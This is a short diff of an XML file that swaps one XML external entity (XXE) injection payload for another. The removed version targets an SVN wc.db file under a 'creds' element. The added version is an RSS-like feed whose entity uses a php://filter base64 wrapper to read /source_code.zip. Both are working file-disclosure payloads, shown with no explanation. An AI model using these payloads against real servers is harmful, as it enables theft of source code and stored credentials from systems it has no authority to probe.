@@ -1,7 +1,14 @@
-<?xml version="1.0"?>
- <!DOCTYPE foo [  
-  <!ELEMENT foo ANY >
-  <!ENTITY file SYSTEM "php://filter/.svn/wc.db" >]>
-<creds>
-  <text>&file;</text>
-</creds>
+<!DOCTYPE feed [
+    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/source_code.zip">
+]>
+
+<feed>
+    <title>XXE</title>
+    <description>XXE</description>
+
+    <entry>
+        <title>XXE</title>
+        <description>XXE</description>
+        <content>&xxe;</content>
+    </entry>
+</feed>
